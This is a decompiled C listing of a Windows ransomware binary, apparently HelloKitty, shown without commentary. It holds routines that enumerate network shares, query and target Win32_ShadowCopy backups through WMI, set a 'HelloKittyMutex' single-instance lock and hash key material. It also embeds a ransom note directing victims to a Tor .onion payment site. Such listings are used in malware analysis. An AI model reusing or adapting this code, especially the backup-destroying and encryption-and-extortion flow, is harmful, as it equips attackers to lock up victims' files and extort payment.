                        // 0x404dbd
                        v16 = v9 + 1;
                        v10 = v11 + 32;
                        v9 = v16;
                        v8 = v13;
                    }
                }
                // 0x404dc6
                *(int32_t *)(v8 - 4) = (int32_t)&lpBufferSize;
                *(int32_t *)(v8 - 8) = v3;
                *(int32_t *)(v8 - 12) = (int32_t)&lpcCount;
                v17 = v8 - 16;
                *(int32_t *)v17 = lphEnum;
                v18 = WNetEnumResourceW(&g266, &g266, &g266, &g266);
                v7 = v17;
            }
        }
        // 0x404ddc
        *(int32_t *)(v7 - 4) = v3;
        *(int32_t *)(v7 - 8) = 0;
        int32_t * v20 = GetProcessHeap(); // 0x404ddf
        v2 = v7 - 12;
        *(int32_t *)v2 = (int32_t)v20;
        HeapFree(&g266, (int32_t)&g266, &g266);
    }
    // 0x404dec
    *(int32_t *)(v2 - 4) = lphEnum;
    // 0x404df5
    return WNetCloseEnum(&g266);
}

// Address range: 0x404e00 - 0x404e2a
int32_t function_404e00(void) {
    // 0x404e00
    if (g240 >= g241) {
        // 0x404e29
        return g241;
    }
    // 0x404e0d
    int32_t v1; // bp-4, 0x404e00
    int32_t v2 = &v1; // 0x404e0e
    v2 -= 4;
    *(int32_t *)v2 = 0x1388;
    Sleep((int32_t)&g266);
    while (g240 < g241) {
        // 0x404e14
        v2 -= 4;
        *(int32_t *)v2 = 0x1388;
        Sleep((int32_t)&g266);
    }
    // 0x404e29
    return g241;
}

// Address range: 0x404e30 - 0x40513e
int32_t function_404e30(uint32_t a1, int32_t a2, int32_t a3) {
    // 0x404e30
    int32_t v1; // bp-4, 0x404e30
    int32_t v2 = &v1; // 0x404e31
    int32_t v3 = v2 - 124; // 0x404e61
    int32_t v4 = 0; // 0x404e4e
    int32_t v5 = 4 * v4; // 0x404e5d
    v4++;
    int32_t v6; // 0x404e30
    *(int32_t *)(v5 + v3) = *(int32_t *)(v5 + v6);
    while (v4 != 16) {
        // 0x404e50
        v5 = 4 * v4;
        v4++;
        *(int32_t *)(v5 + v3) = *(int32_t *)(v5 + v6);
    }
    int32_t v7 = a1 / 2; // 0x404e6d
    if (a1 >= 2) {
        v7--;
        while (v7 != 0) {
            // 0x404ed0
            v7--;
        }
    }
    // 0x4050b7
    int32_t v8; // 0x404e30
    int32_t v9 = v8 + 4; // 0x4050c2
    int32_t v10 = v6 + 12; // 0x4050c2
    uint32_t v11 = 2;
    int32_t v12 = 4 * v11; // 0x4050c4
    int32_t v13 = *(int32_t *)(v10 - 12); // 0x4050e0
    *(int32_t *)(v9 - 4) = v13 + *(int32_t *)(v12 - 8 + v3);
    int32_t v14 = *(int32_t *)(v6 - v8 + v9); // 0x4050f8
    *(int32_t *)v9 = v14 + *(int32_t *)((v12 - 4 & -16 | 4) + v3);
    int32_t v15 = *(int32_t *)(v10 - 4); // 0x405111
    *(int32_t *)(v9 + 4) = v15 + *(int32_t *)(v12 + v3);
    int32_t v16 = *(int32_t *)v10; // 0x405129
    *(int32_t *)(v9 + 8) = v16 + *(int32_t *)(v2 - 120 + v12);
    int32_t v17 = v11 + 4; // 0x405135
    v9 += 16;
    v10 += 16;
    while (v11 < 14) {
        // 0x4050c4
        v11 = v17;
        v12 = 4 * v11;
        v13 = *(int32_t *)(v10 - 12);
        *(int32_t *)(v9 - 4) = v13 + *(int32_t *)(v12 - 8 + v3);
        v14 = *(int32_t *)(v6 - v8 + v9);
        *(int32_t *)v9 = v14 + *(int32_t *)((v12 - 4 & -16 | 4) + v3);
        v15 = *(int32_t *)(v10 - 4);
        *(int32_t *)(v9 + 4) = v15 + *(int32_t *)(v12 + v3);
        v16 = *(int32_t *)v10;
        *(int32_t *)(v9 + 8) = v16 + *(int32_t *)(v2 - 120 + v12);
        v17 = v11 + 4;
        v9 += 16;
        v10 += 16;
    }
    // 0x405137
    return 18;
}

// Address range: 0x405140 - 0x405362
int32_t function_405140(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x405140
    int32_t v1; // 0x405140
    int32_t v2; // 0x405140
    function_404e30(a5, v1, v2);
    int32_t v3 = 0;
    int32_t v4; // bp-4, 0x405140
    uint32_t v5 = *(int32_t *)((int32_t)&v4 - 128 + (v3 & 0x7ffffffc)); // 0x40534d
    int32_t v6; // 0x405140
    *(char *)(v3 + v6) = (char)(v5 >> (8 * v3 & 24));
    int32_t v7 = v3 + 1; // 0x405356
    while (v7 != 64) {
        // 0x405340
        v3 = v7;
        v5 = *(int32_t *)((int32_t)&v4 - 128 + (v3 & 0x7ffffffc));
        *(char *)(v3 + v6) = (char)(v5 >> (8 * v3 & 24));
        v7 = v3 + 1;
    }
    // 0x40535c
    return 64;
}

// Address range: 0x405370 - 0x4053cc
int32_t function_405370(int32_t a1, int32_t a2, int32_t a3) {
    // 0x405370
    int32_t v1; // bp-96, 0x405370
    int32_t v2 = &v1; // 0x405378
    uint32_t v3 = 0;
    int32_t v4; // 0x405370
    int32_t v5 = v4; // 0x405391
    if (v3 == 0) {
        // 0x405393
        *(int32_t *)(v2 - 4) = a3;
        *(int32_t *)(v2 - 8) = 0;
        *(int32_t *)(v2 - 12) = v3 / 64;
        *(int32_t *)(v2 - 16) = a2;
        *(int32_t *)(v2 - 20) = a1;
        v5 = function_405140((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    }
    // 0x4053b8
    int32_t v6; // bp-4, 0x405370
    unsigned char v7 = *(char *)((int32_t)&v6 - 76 + v3); // 0x4053b8
    int32_t result = v5 & -256 | (int32_t)v7; // 0x4053b8
    int32_t v8; // 0x405370
    char * v9 = (char *)(v3 + v8); // 0x4053bc
    *v9 = *v9 ^ v7;
    int32_t v10 = v3 + 1; // 0x4053bf
    while (v10 != 32) {
        // 0x405391
        v3 = v10;
        v5 = result;
        if (v3 == 0) {
            // 0x405393
            *(int32_t *)(v2 - 4) = a3;
            *(int32_t *)(v2 - 8) = 0;
            *(int32_t *)(v2 - 12) = v3 / 64;
            *(int32_t *)(v2 - 16) = a2;
            *(int32_t *)(v2 - 20) = a1;
            v5 = function_405140((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        }
        // 0x4053b8
        v7 = *(char *)((int32_t)&v6 - 76 + v3);
        result = v5 & -256 | (int32_t)v7;
        v9 = (char *)(v3 + v8);
        *v9 = *v9 ^ v7;
        v10 = v3 + 1;
    }
    // 0x4053c5
    return result;
}

// Address range: 0x4053d0 - 0x4055d2
int32_t function_4053d0(int32_t * a1, int32_t a2) {
    // 0x4053d0
    int32_t v1; // 0x4053d0
    __asm_rdtsc(v1);
    __asm_rdtsc_8(0);
    __asm_rdtsc_9(0);
    uint32_t processId = GetCurrentProcessId(); // 0x4053e6
    if (processId == 0 || GetCurrentThreadId() == 0 || GetTickCount() == 0) {
        // 0x4055cb
        return 0;
    }
    // 0x405415
    int32_t lpSystemTimeAsFileTime; // bp-32, 0x4053d0
    GetSystemTimeAsFileTime((struct _FILETIME *)&lpSystemTimeAsFileTime);
    int32_t lpPerformanceCount; // bp-44, 0x4053d0
    if (!QueryPerformanceCounter((struct _LARGE_INTEGER *)&lpPerformanceCount)) {
        // 0x4055cb
        return 0;
    }
    char v2 = processId / 0x1000000; // bp-92, 0x405439
    for (int32_t i = 0; i < 32; i++) {
        // 0x405533
        __asm_rdtsc_10();
        *(char *)(i + (int32_t)a1) = 0;
    }
    // 0x40554f
    int32_t lpSystemTime; // bp-60, 0x4053d0
    GetSystemTime((struct _SYSTEMTIME *)&lpSystemTime);
    int32_t lpFileTime; // bp-24, 0x4053d0
    SystemTimeToFileTime((struct _SYSTEMTIME *)&lpSystemTime, (struct _FILETIME *)&lpFileTime);
    int32_t v3; // 0x4053d0
    int32_t v4 = function_411e90(lpFileTime, v3, 0x2710, 0, 4); // 0x405576
    function_405370(v4, 0, (int32_t)&g266);
    GetSystemTime((struct _SYSTEMTIME *)&lpSystemTime);
    SystemTimeToFileTime((struct _SYSTEMTIME *)&lpSystemTime, (struct _FILETIME *)&lpFileTime);
    int32_t v5 = function_411e90(lpFileTime, v3, 0x2710, 0, 12); // 0x4055b4
    // 0x4055cb
    return function_405370(v5, (int32_t)&v2, (int32_t)&g266);
}

// Address range: 0x4055e0 - 0x405784
int32_t function_4055e0(int32_t a1, int32_t a2, int32_t a3) {
    // 0x405670
    int32_t v1; // bp-4, 0x4055e0
    int32_t v2 = &v1; // 0x4055e1
    HeapAlloc(GetProcessHeap(), (int32_t)&g266, (int32_t)&g266);
    int32_t v3 = 1; // bp-32, 0x405625
    int32_t * hHeap = GetProcessHeap(); // 0x405633
    int32_t v4 = (int32_t)hHeap; // bp-368, 0x405635
    int32_t v5 = &v4; // 0x405635
    HeapAlloc(hHeap, (int32_t)&g266, (int32_t)&g266);
    int32_t v6 = v2 - 324;
    int32_t * v7 = (int32_t *)(v5 - 8);
    int16_t v8 = 512; // bp-328, 0x405646
    for (int32_t i = 2; i < 163; i++) {
        int32_t v9 = function_4099d7(); // 0x405670
        *(char *)(v6 + i) = (char)((0x100000000 * (int64_t)(v9 >> 31) | (int64_t)v9) % 254) + 1;
    }
    int32_t * v10 = (int32_t *)(v5 - 4);
    *v10 = 92;
    *(char *)(v2 - 161) = 0;
    *v7 = a2;
    int32_t v11; // bp-327, 0x4055e0
    *(int32_t *)(v5 - 12) = (int32_t)&v11 + 163;
    function_4093e0((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    *v10 = (int32_t)&v8;
    function_404550((int32_t)&g266);
    int128_t v12; // bp-68, 0x4055e0
    __asm_movups_1(0x8000000000000000 * v12 / 0x8000000000000000, __asm_movups((int128_t)a3));
    int64_t v13; // 0x4055e0
    int128_t v14 = __asm_movq(v13); // 0x4056d5
    *v10 = (int32_t)&v12;
    int64_t v15; // 0x4055e0
    __asm_movq_2(v15, v14);
    int32_t v16; // bp-56, 0x4055e0
    *v7 = (int32_t)&v16;
    function_4040b0((int32_t)&g266, (int32_t)&g266);
    *v10 = (int32_t)&v3;
    function_404630((int32_t)&g266);
    return 256;
}

// Address range: 0x405790 - 0x405796
int32_t function_405790(void) {
    // 0x405790
    return &g254;
}

// Address range: 0x4057a0 - 0x405a22
int32_t function_4057a0(void) {
    // 0x4057a0
    int32_t result2; // bp-16, 0x4057a0
    int32_t result = CoCreateInstance((int32_t)&g21, NULL, 1, &g19, (int32_t **)&result2); // 0x4057c1
    if (result < 0) {
        // 0x405a1b
        return result;
    }
    int32_t v1 = 0; // bp-24, 0x4057d5
    int32_t * moduleHandle = GetModuleHandleA("kernel32.dll"); // 0x4057dc
    int32_t v2 = (int32_t)moduleHandle; // bp-108, 0x4057e2
    int32_t (*func)() = GetProcAddress(moduleHandle, (char *)&g266); // 0x4057e3
    int32_t v3 = &v2; // 0x4057f3
    int32_t v4; // bp-116, 0x4057a0
    int32_t v5; // 0x4057a0
    int32_t v6; // bp-60, 0x4057a0
    if (func != NULL) {
        int32_t * processHandle = GetCurrentProcess(); // 0x4057f9
        v4 = (int32_t)processHandle;
        int32_t v7 = &v4; // 0x4057ff
        v3 = v7;
        if (processHandle != NULL && v1 != 0) {
            int32_t v8 = &v6; // 0x40580f
            *(int32_t *)(v7 - 4) = v8;
            VariantInit(&g266);
            v6 = 3;
            *(int32_t *)(v7 - 8) = v8;
            *(int32_t *)(v7 - 12) = 0;
            *(int32_t *)(v7 - 16) = (int32_t)L"__ProviderArchitecture";
            *(int32_t *)(v7 - 20) = result2;
            int32_t v9 = v7 - 24; // 0x40583d
            *(int32_t *)v9 = v8;
            VariantClear((int32_t *)v6);
            v5 = 64;
            v3 = v9;
        }
    }
    // 0x405840
    int32_t v10; // bp-28, 0x4057a0
    *(int32_t *)(v3 - 4) = (int32_t)&v10;
    *(int32_t *)(v3 - 8) = (int32_t)&g18;
    *(int32_t *)(v3 - 12) = 0x4401;
    *(int32_t *)(v3 - 16) = 0;
    int32_t v11 = v3 - 20; // 0x405850
    *(int32_t *)v11 = (int32_t)&g20;
    int32_t v12 = CoCreateInstance(v4, &g266, (int32_t)&g266, &g266, (int32_t **)&g266); // 0x405855
    int32_t v13 = v11; // 0x405859
    if (v12 >= 0 && v10 != 0) {
        // 0x405869
        *(int32_t *)(v3 - 24) = (int32_t)L"ROOT\\cimv2";
        int16_t * v14 = SysAllocString((int16_t *)&g266); // 0x405874
        int32_t v15 = (int32_t)v14; // 0x405874
        int32_t v16; // bp-12, 0x4057a0
        *(int32_t *)(v3 - 28) = (int32_t)&v16;
        *(int32_t *)(v3 - 32) = result2;
        *(int32_t *)(v3 - 36) = 0;
        *(int32_t *)(v3 - 40) = 0;
        *(int32_t *)(v3 - 44) = 0;
        *(int32_t *)(v3 - 48) = 0;
        *(int32_t *)(v3 - 52) = 0;
        *(int32_t *)(v3 - 56) = v15;
        int32_t v17 = v3 - 60; // 0x405890
        *(int32_t *)v17 = v10;
        int32_t v18 = v17; // 0x405896
        if (v14 >= NULL) {
            // 0x40589c
            v18 = v17;
            if (v16 != 0) {
                // 0x4058a7
                *(int32_t *)(v3 - 64) = 0;
                *(int32_t *)(v3 - 68) = 0;
                *(int32_t *)(v3 - 72) = 3;
                *(int32_t *)(v3 - 76) = 3;
                *(int32_t *)(v3 - 80) = 0;
                *(int32_t *)(v3 - 84) = 0;
                *(int32_t *)(v3 - 88) = 10;
                int32_t v19 = v3 - 92; // 0x4058b5
                *(int32_t *)v19 = v16;
                uint32_t v20 = CoSetProxyBlanket((int32_t *)v14, (int32_t)&g266, (int32_t)&g266, (int16_t *)&g266, (int32_t)&g266, (int32_t)&g266, &g266, (int32_t)&g266); // 0x4058b6
                int32_t v21 = v19; // 0x4058c4
                if (v20 >= 0) {
                    // 0x4058ca
                    *(int32_t *)(v3 - 96) = (int32_t)L"WQL";
                    int16_t * v22 = NULL; // bp-20, 0x4058cf
                    int16_t * v23 = SysAllocString(NULL); // 0x4058d6
                    int32_t v24 = (int32_t)v23; // 0x4058d6
                    *(int32_t *)(v3 - 100) = (int32_t)L"select * from Win32_ShadowCopy";
                    int16_t * v25 = SysAllocString(v23); // 0x4058e0
                    int32_t v26 = (int32_t)v25; // 0x4058e0
                    *(int32_t *)(v3 - 104) = (int32_t)&v22;
                    *(int32_t *)(v3 - 108) = 0;
                    *(int32_t *)(v3 - 112) = 48;
                    *(int32_t *)(v3 - 116) = v26;
                    *(int32_t *)(v3 - 120) = v24;
                    int32_t v27 = v3 - 124; // 0x4058f6
                    *(int32_t *)v27 = v16;
                    int32_t v28 = v27; // 0x4058fc
                    if (v25 >= NULL) {
                        // 0x405902
                        int16_t * lpString; // bp-8, 0x4057a0
                        int32_t v29 = (int32_t)&lpString; // 0x405908
                        *(int32_t *)(v3 - 128) = v29;
                        lpString = NULL;
                        int32_t v30 = &v1; // 0x405913
                        *(int32_t *)(v3 - 132) = v30;
                        *(int32_t *)(v3 - 136) = 1;
                        *(int32_t *)(v3 - 140) = -1;
                        int32_t v31 = v3 - 144; // 0x40591a
                        *(int32_t *)v31 = (int32_t)v22;
                        v28 = v31;
                        if (lpString != NULL) {
                            int32_t v32 = &v6; // 0x40593a
                            *(int32_t *)(v31 - 4) = 0;
                            *(int32_t *)(v31 - 8) = 0;
                            *(int32_t *)(v31 - 12) = v32;
                            *(int32_t *)(v31 - 16) = 0;
                            *(int32_t *)(v31 - 20) = (int32_t)L"id";
                            int32_t v33 = v31 - 24; // 0x405944
                            *(int32_t *)v33 = v1;
                            int32_t v34 = v33; // 0x40594a
                            int32_t * v35; // 0x405969
                            int32_t v36; // 0x405969
                            int32_t v37; // 0x405974
                            int32_t * v38; // 0x405975
                            int32_t * v39; // 0x40597a
                            int32_t v40; // 0x40597b
                            int32_t * v41; // 0x405984
                            int32_t * v42; // 0x405985
                            int32_t v43; // 0x4059b3
                            int32_t * v44; // 0x4059a7
                            int32_t v45; // 0x4059a9
                            if (v1 >= 0) {
                                // 0x40594c
                                v34 = v33;
                                if ((int16_t)v6 == 8) {
                                    // 0x405953
                                    *(int32_t *)(v31 - 28) = v5;
                                    *(int32_t *)(v31 - 32) = 2 * lstrlenW(lpString) + 52;
                                    *(int32_t *)(v31 - 36) = 8;
                                    *(int32_t *)(v31 - 40) = (int32_t)GetProcessHeap();
                                    v35 = HeapAlloc(&g266, (int32_t)&g266, (int32_t)&g266);
                                    v36 = (int32_t)v35;
                                    v37 = v31 - 44;
                                    *(int32_t *)v37 = v5;
                                    v38 = (int32_t *)(v31 - 48);
                                    *v38 = (int32_t)L"Win32_ShadowCopy.ID='%s'";
                                    v39 = (int32_t *)(v31 - 52);
                                    *v39 = v5;
                                    v40 = lstrlenW((int16_t *)&g266);
                                    v41 = (int32_t *)(v31 - 56);
                                    *v41 = v40 + 26;
                                    v42 = (int32_t *)(v31 - 60);
                                    *v42 = v36;
                                    wnsprintfW();
                                    v45 = v37;
                                    if (v35 != NULL) {
                                        // 0x405993
                                        *v38 = 0;
                                        *v39 = result2;
                                        *v41 = 0;
                                        *v42 = v36;
                                        *(int32_t *)(v31 - 64) = v16;
                                        *(int32_t *)(v31 - 68) = v36;
                                        *(int32_t *)(v31 - 72) = 0;
                                        v44 = GetProcessHeap();
                                        v45 = v31 - 76;
                                        *(int32_t *)v45 = (int32_t)v44;
                                        HeapFree(&g266, (int32_t)&g266, &g266);
                                    }
                                    // 0x4059b0
                                    v43 = v45 - 4;
                                    *(int32_t *)v43 = v32;
                                    VariantClear(&g266);
                                    v34 = v43;
                                }
                            }
                            // 0x4059b6
                            *(int32_t *)(v34 - 4) = v1;
                            *(int32_t *)(v34 - 8) = v32;
                            VariantClear((int32_t *)lpString);
                            *(int32_t *)(v34 - 12) = v29;
                            lpString = NULL;
                            *(int32_t *)(v34 - 16) = v30;
                            *(int32_t *)(v34 - 20) = 1;
                            *(int32_t *)(v34 - 24) = -1;
                            int32_t v46 = v34 - 28; // 0x4059dd
                            *(int32_t *)v46 = (int32_t)v22;
                            v28 = v46;
                            while (lpString != NULL) {
                                int32_t v47 = v46;
                                *(int32_t *)(v47 - 4) = 0;
                                *(int32_t *)(v47 - 8) = 0;
                                *(int32_t *)(v47 - 12) = v32;
                                *(int32_t *)(v47 - 16) = 0;
                                *(int32_t *)(v47 - 20) = (int32_t)L"id";
                                v33 = v47 - 24;
                                *(int32_t *)v33 = v1;
                                v34 = v33;
                                if (v1 >= 0) {
                                    // 0x40594c
                                    v34 = v33;
                                    if ((int16_t)v6 == 8) {
                                        // 0x405953
                                        *(int32_t *)(v47 - 28) = v5;
                                        *(int32_t *)(v47 - 32) = 2 * lstrlenW(lpString) + 52;
                                        *(int32_t *)(v47 - 36) = 8;
                                        *(int32_t *)(v47 - 40) = (int32_t)GetProcessHeap();
                                        v35 = HeapAlloc(&g266, (int32_t)&g266, (int32_t)&g266);
                                        v36 = (int32_t)v35;
                                        v37 = v47 - 44;
                                        *(int32_t *)v37 = v5;
                                        v38 = (int32_t *)(v47 - 48);
                                        *v38 = (int32_t)L"Win32_ShadowCopy.ID='%s'";
                                        v39 = (int32_t *)(v47 - 52);
                                        *v39 = v5;
                                        v40 = lstrlenW((int16_t *)&g266);
                                        v41 = (int32_t *)(v47 - 56);
                                        *v41 = v40 + 26;
                                        v42 = (int32_t *)(v47 - 60);
                                        *v42 = v36;
                                        wnsprintfW();
                                        v45 = v37;
                                        if (v35 != NULL) {
                                            // 0x405993
                                            *v38 = 0;
                                            *v39 = result2;
                                            *v41 = 0;
                                            *v42 = v36;
                                            *(int32_t *)(v47 - 64) = v16;
                                            *(int32_t *)(v47 - 68) = v36;
                                            *(int32_t *)(v47 - 72) = 0;
                                            v44 = GetProcessHeap();
                                            v45 = v47 - 76;
                                            *(int32_t *)v45 = (int32_t)v44;
                                            HeapFree(&g266, (int32_t)&g266, &g266);
                                        }
                                        // 0x4059b0
                                        v43 = v45 - 4;
                                        *(int32_t *)v43 = v32;
                                        VariantClear(&g266);
                                        v34 = v43;
                                    }
                                }
                                // 0x4059b6
                                *(int32_t *)(v34 - 4) = v1;
                                *(int32_t *)(v34 - 8) = v32;
                                VariantClear((int32_t *)lpString);
                                *(int32_t *)(v34 - 12) = v29;
                                lpString = NULL;
                                *(int32_t *)(v34 - 16) = v30;
                                *(int32_t *)(v34 - 20) = 1;
                                *(int32_t *)(v34 - 24) = -1;
                                v46 = v34 - 28;
                                *(int32_t *)v46 = (int32_t)v22;
                                v28 = v46;
                            }
                        }
                    }
                    // 0x4059f1
                    *(int32_t *)(v28 - 4) = v24;
                    SysFreeString((int16_t *)&g266);
                    v21 = v28 - 8;
                    *(int32_t *)v21 = v26;
                    SysFreeString((int16_t *)&g266);
                }
                // 0x4059fb
                *(int32_t *)(v21 - 4) = v15;
                SysFreeString((int16_t *)&g266);
                int32_t v48 = v21 - 8; // 0x405a03
                *(int32_t *)v48 = v16;
                v18 = v48;
            }
        }
        // 0x405a09
        v13 = v18 - 4;
        *(int32_t *)v13 = v10;
    }
    // 0x405a12
    *(int32_t *)(v13 - 4) = result2;
    // 0x405a1b
    return result2;
}

// Address range: 0x405a30 - 0x405f50
int32_t function_405a30(void) {
    // 0x405a30
    int32_t v1; // 0x405a30
    function_4119e0(v1);
    int32_t v2 = 1; // bp-28, 0x405a42
    SetErrorMode(1);
    int32_t v3 = &v2; // 0x405a51
    if (g237 == 0) {
        int32_t * hObject = OpenMutexW(0x100000, false, L"HelloKittyMutex"); // 0x405a5f
        g237 = (int32_t)hObject;
        int16_t * v4; // bp-44, 0x405a30
        if (hObject != NULL) {
            // 0x405a6e
            v4 = (int16_t *)hObject;
            CloseHandle(hObject);
            // 0x405a9c
            *(int32_t *)((int32_t)&v4 - 4) = 0;
            ExitProcess((int32_t)&g266);
            // UNREACHABLE
        }
        // 0x405a77
        v4 = L"HelloKittyMutex";
        struct _SECURITY_ATTRIBUTES * v5 = NULL; // bp-52, 0x405a7e
        int32_t v6 = (int32_t)&v5; // 0x405a7e
        int32_t * v7 = CreateMutexW(NULL, false, L"HelloKittyMutex"); // 0x405a80
        g237 = (int32_t)v7;
        v3 = v6;
        if (v7 == NULL) {
            // 0x405a8f
            v3 = v6;
            if (GetLastError() != 183) {
                // 0x405a9c
                *(int32_t *)(v6 - 4) = 0;
                ExitProcess((int32_t)&g266);
                // UNREACHABLE
            }
        }
    }
    // 0x405aa4
    *(int32_t *)(v3 + 144) = 0x6a09e667;
    int128_t v8; // 0x405a30
    int128_t v9 = __asm_xorps(v8, v8); // 0x405ab1
    int32_t * v10 = (int32_t *)(v3 + 128); // 0x405ab4
    *v10 = 0;
    int32_t v11 = v3 + 136; // 0x405abb
    __asm_movlpd(*(int64_t *)v11, v9);
    *(int32_t *)(v3 + 148) = -0x4498517b;
    *(int32_t *)(v3 + 152) = 0x3c6ef372;
    *(int32_t *)(v3 + 156) = -0x5ab00ac6;
    *(int32_t *)(v3 + 160) = 0x510e527f;
    *(int32_t *)(v3 + 164) = -0x64fa9774;
    *(int32_t *)(v3 + 168) = 0x1f83d9ab;
    *(int32_t *)(v3 + 172) = 0x5be0cd19;
    int32_t * v12 = (int32_t *)v11;
    int32_t * v13 = (int32_t *)(v3 + 140);
    int32_t v14 = 0; // 0x405b08
    for (int32_t i = 0; i < 256; i++) {
        char v15 = *(char *)(i + (int32_t)&g144); // 0x405b13
        *(char *)(v3 + 64 + v14) = v15;
        int32_t v16 = *v10; // 0x405b1d
        int32_t v17 = v16 + 1; // 0x405b24
        *v10 = v17;
        v14 = v17;
        if (v16 == 63) {
            // 0x405b31
            function_401410();
            uint32_t v18 = *v12; // 0x405b3c
            *v12 = v18 + 512;
            *v13 = *v13 + (int32_t)(v18 > 0xfffffdff);
            *v10 = 0;
            v14 = 0;
        }
    }
    // 0x405b61
    function_4015c0();
    *(char *)(v3 + 208) = 0;
    int32_t v19 = v3; // 0x405b7e
    int32_t v20; // 0x405a30
    int32_t v21; // 0x405b80
    int32_t v22; // 0x405b92
    int32_t * v23; // 0x405a30
    int32_t * v24; // 0x405a30
    for (int32_t i = 0; i < 32; i++) {
        // 0x405b80
        v20 = v19;
        v21 = v20 + 32;
        int32_t * v25 = (int32_t *)(v20 - 4); // 0x405b85
        *v25 = (int32_t)*(char *)(v21 + i);
        v19 = v20 - 8;
        int32_t * v26 = (int32_t *)v19; // 0x405b86
        *v26 = (int32_t)"%02x";
        int32_t v27 = v20 + 176; // 0x405b8b
        v22 = v20 - 12;
        v23 = (int32_t *)v22;
        *v23 = 32;
        v24 = (int32_t *)(v20 - 16);
        *v24 = v27;
        wnsprintfA();
        *v25 = v27;
        *v26 = v20 + 208;
        lstrcatA((char *)&g266, (char *)&g266);
    }
    // 0x405bb6
    *v23 = (int32_t)L"Hello dear user.\r\nYour files have been encrypted.\r\n\r\n-- What does it mean?!\r\nContent of your files have been modified. Without special key you can't undo that operation.\r\n\r\n-- How to get special key?\r\nIf you want to get it, you must pay us some money and we will help you.\r\nWe will give you special decryption program and instructions.\r\n\r\n-- Ok, how i can pay you?\r\n1) Download TOR browser, if you don't know how to do it you can google it.\r\n2) Open this website in tor browser: %s/%S\r\n3) Follow instructions in chat. \r\n";
    int32_t v28 = lstrlenW((int16_t *)&g266); // 0x405bc1
    *v24 = (v28 & 0x40000000) == 0 ? 4 * v28 : -1;
    int32_t v29 = function_4065e3(); // 0x405bd6
    int32_t v30 = v22; // 0x405be2
    if (v29 != 0) {
        // 0x405be8
        *v24 = v20 + 196;
        int32_t * v31 = (int32_t *)(v20 - 20); // 0x405bf0
        *v31 = (int32_t)L"http://6x7dp6h3w6q3ugjv4yv5gycj3femb24kysgry5b44hhgfwc5ml5qrdad.onion";
        v30 = v20 - 24;
        int32_t * v32 = (int32_t *)v30; // 0x405bf5
        *v32 = (int32_t)L"Hello dear user.\r\nYour files have been encrypted.\r\n\r\n-- What does it mean?!\r\nContent of your files have been modified. Without special key you can't undo that operation.\r\n\r\n-- How to get special key?\r\nIf you want to get it, you must pay us some money and we will help you.\r\nWe will give you special decryption program and instructions.\r\n\r\n-- Ok, how i can pay you?\r\n1) Download TOR browser, if you don't know how to do it you can google it.\r\n2) Open this website in tor browser: %s/%S\r\n3) Follow instructions in chat. \r\n";
        int32_t * v33 = (int32_t *)(v20 - 28); // 0x405bfa
        *v33 = v29;
        wsprintfW((int16_t *)&g266, (int16_t *)&g266);
        *v24 = v29;
        int32_t v34 = lstrlenW((int16_t *)&g266); // 0x405c05
        *(int32_t *)v21 = 0;
        *v31 = v34;
        *(int16_t *)(v20 + 16) = 0;
        *v32 = v29;
        *(int32_t *)(v20 + 36) = 7;
        function_405f50((int32_t)&g266, (int32_t)&g266);
        if (g147 >= 8) {
            int32_t v35 = g145; // 0x405c34
            int32_t v36 = 2 * g147; // 0x405c39
            int32_t v37 = v36 + 2; // 0x405c39
            int32_t v38 = v37; // 0x405c46
            int32_t v39 = v35; // 0x405c46
            if (v37 >= 0x1000) {
                int32_t v40 = v35 - 4;
                v39 = *(int32_t *)v40;
                if (v40 - v39 >= 32) {
                    // 0x405f3e
                    function_409c03();
                    __asm_int3();
                    __asm_int3();
                    __asm_int3();
                    __asm_int3();
                    __asm_int3();
                    __asm_int3();
                    __asm_int3();
                    __asm_int3();
                    __asm_int3();
                    __asm_int3();
                    __asm_int3();
                    __asm_int3();
                    return __asm_int3();
                }
                // 0x405c5c
                v38 = v36 + 37;
            }
            // 0x405c5e
            *v33 = v38;
            *(int32_t *)(v20 - 32) = v39;
            function_4060cb((int32_t)&g266);
        }
        int128_t v41 = __asm_movups(*(int128_t *)(v20 + 8)); // 0x405c68
        *v33 = v29;
        __asm_movups_1(g145, v41);
        __asm_movq_2(g146, __asm_movq(*(int64_t *)(v20 + 24)));
        function_406366();
    }
    int32_t v42 = v30 + 20; // 0x405c8b
    *(int32_t *)v42 = 0;
    *(int32_t *)(v30 - 4) = v42;
    int16_t * v43 = GetCommandLineW(); // 0x405c98
    int32_t v44 = v30 - 8; // 0x405c9e
    *(int32_t *)v44 = (int32_t)v43;
    int16_t ** v45 = CommandLineToArgvW((int16_t *)&g266, &g266); // 0x405c9f
    int32_t result = (int32_t)v45; // 0x405c9f
    *(int32_t *)(v30 + 16) = result;
    if (v45 == NULL) {
        // 0x405cad
        return result;
    }
    int32_t v46 = v44; // 0x405cba
    if (*(int32_t *)(v30 + 12) >= 3) {
        // 0x405cbc
        *(int32_t *)(v30 - 12) = (int32_t)L"-path";
        int32_t v47 = v30 - 16; // 0x405cc1
        *(int32_t *)v47 = *(int32_t *)(result + 4);
        int32_t v48 = lstrcmpiW((int16_t *)&g266, (int16_t *)&g266); // 0x405cc4
        v46 = v47;
        if (v48 == 0) {
            int32_t * v49 = (int32_t *)(v30 - 20); // 0x405cce
            *v49 = 0xfffe;
            int32_t v50 = function_409c53(); // 0x405cd3
            v46 = v47;
            if (v50 != 0) {
                // 0x405ce1
                *v49 = *(int32_t *)(*(int32_t *)(v30 + 8) + 8);
                *(int32_t *)(v30 - 24) = v50;
                lstrcpyW((int16_t *)&g266, (int16_t *)&g266);
                *(int32_t *)(v30 - 28) = v50;
                PathRemoveBackslashW((int16_t *)&g266);
                int32_t v51 = v30 - 32; // 0x405cf6
                *(int32_t *)v51 = v50;
                function_404b60((int32_t)&g266);
                v46 = v51;
            }
        }
    }
    int32_t v52 = v46; // 0x405d01
    int32_t v53 = 0; // 0x405d01
    int32_t v54 = v46; // 0x405d01
    int32_t v55; // 0x405a30
    int32_t v56; // 0x405a30
    int32_t v57; // 0x405a30
    int32_t v58; // 0x405a30
    int32_t v59; // 0x405a30
    int32_t v60; // 0x405a30
    if (*(int32_t *)(v46 + 20) == 1) {
        int32_t * v61 = (int32_t *)(v52 - 4); // 0x405d10
        *v61 = *(int32_t *)(v53 + (int32_t)&g73);
        int32_t v62 = v52 + 1024; // 0x405d16
